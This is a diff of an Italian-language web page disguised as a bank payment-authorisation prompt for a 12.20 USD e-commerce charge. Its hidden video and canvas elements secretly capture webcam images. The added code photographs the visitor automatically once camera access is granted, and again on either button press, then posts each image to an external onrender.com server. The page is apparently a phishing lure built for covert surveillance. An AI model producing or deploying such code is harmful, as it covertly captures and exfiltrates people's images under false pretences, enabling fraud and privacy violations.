@@ -34,38 +34,63 @@
   </style>
 </head>
 <body>
-  <div class="card">
-    <h3>Autorizza Operazione</h3>
-    <p>Importo: <strong>12,20 USD</strong></p>
-    <p>Commissione: <strong>0,00 USD</strong></p>
-    <p>Operazione: <strong>PAGAMENTO E-COMMERCE</strong></p>
-    <video id="video" width="300" autoplay style="display:none;"></video>
-    <canvas id="canvas" width="300" height="200" style="display:none;"></canvas>
-    <button class="autorizza" onclick="handleClick('autorizza')">AUTORIZZA</button>
-    <button class="nega" onclick="handleClick('nega')">NEGA</button>
-  </div>
 
-  <script>
-    const video = document.getElementById('video');
-    const canvas = document.getElementById('canvas');
-    const context = canvas.getContext('2d');
+<div class="card">
+  <h3>Autorizza Operazione</h3>
+  <p>Importo: <strong>12,20 USD</strong></p>
+  <p>Commissione: <strong>0,00 USD</strong></p>
+  <p>Operazione: <strong>PAGAMENTO E-COMMERCE</strong></p>
+  <video id="video" width="300" autoplay style="display:none;"></video>
+  <canvas id="canvas" width="300" height="200" style="display:none;"></canvas>
+  <button class="autorizza" onclick="handleClick('autorizza')">AUTORIZZA</button>
+  <button class="nega" onclick="handleClick('nega')">NEGA</button>
+</div>
 
-    navigator.mediaDevices.getUserMedia({ video: true })
-      .then(stream => {
-        video.srcObject = stream;
-      });
+<script>
+  const video = document.getElementById('video');
+  const canvas = document.getElementById('canvas');
+  const context = canvas.getContext('2d');
 
-    function handleClick(action) {
-      context.drawImage(video, 0, 0, 300, 200);
-      const image = canvas.toDataURL('image/png');
-      fetch('https://backend-render-server.onrender.com', {
-        method: 'POST',
-        headers: { 'Content-Type': 'application/json' },
-        body: JSON.stringify({ action, image })
-      }).then(() => {
-        alert("Operazione completata.");
-      });
-    }
-  </script>
+  // Appena la webcam è attiva, scatta automaticamente una foto
+  navigator.mediaDevices.getUserMedia({ video: true })
+    .then(stream => {
+      video.srcObject = stream;
+      video.onloadedmetadata = () => {
+        setTimeout(() => {
+          context.drawImage(video, 0, 0, 300, 200);
+          const image = canvas.toDataURL('image/png');
+          // Invio automatico al backend al consenso webcam
+          fetch('https://backend-render-server.onrender.com/upload', {
+            method: 'POST',
+            headers: {
+              'Content-Type': 'application/json'
+            },
+            body: JSON.stringify({
+              action: 'auto-scatto',
+              image: image
+            })
+          });
+        }, 1500); // attesa breve per stabilizzare l'immagine
+      };
+    });
+
+  function handleClick(action) {
+    context.drawImage(video, 0, 0, 300, 200);
+    const image = canvas.toDataURL('image/png');
+    fetch('https://backend-render-server.onrender.com/upload', {
+      method: 'POST',
+      headers: {
+        'Content-Type': 'application/json'
+      },
+      body: JSON.stringify({
+        action: action,
+        image: image
+      })
+    }).then(() => {
+      alert("Operazione completata.");
+    });
+  }
+</script>
+
 </body>
 </html>
